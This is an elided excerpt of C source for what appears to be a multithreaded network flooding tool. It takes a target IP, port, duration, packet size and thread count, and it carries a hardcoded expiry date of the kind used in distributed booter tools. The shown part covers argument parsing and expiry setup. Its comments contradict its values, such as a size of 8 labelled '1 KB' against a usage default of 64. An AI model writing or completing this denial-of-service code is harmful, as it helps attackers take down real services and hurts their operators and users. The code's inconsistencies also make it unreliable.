...
#define DEFAULT_PACKET_SIZE 8 // Default packet size (1 KB)
#define DEFAULT_THREAD_COUNT 1000 // Default number of threads
...
int main(int argc, char *argv[]) {
    if (argc < 3) {
        printf("\n\033[1;33mUsage: %s <IP> <PORT> [DURATION=60] [PACKET_SIZE=64] [THREADS=1000]\033[0m\n", argv[0]);
        return EXIT_FAILURE;
    }

    // Set expiration date (Hardcoded to April 8, 2025)
    struct tm expiration_time = {0};
    expiration_time.tm_year = EXPIRATION_YEAR - 1900; // tm_year is years since 1900
    expiration_time.tm_mon = EXPIRATION_MONTH - 1; // tm_mon is 0-based
    ...
    int duration = (argc > 3) ? atoi(argv[3]) : 60;  // Default duration = 60
    int packet_size = (argc > 4) ? atoi(argv[4]) : 64; // Default packet size = 64
    int thread_count = (argc > 5) ? atoi(argv[5]) : 1000; // Default thread count = 1000
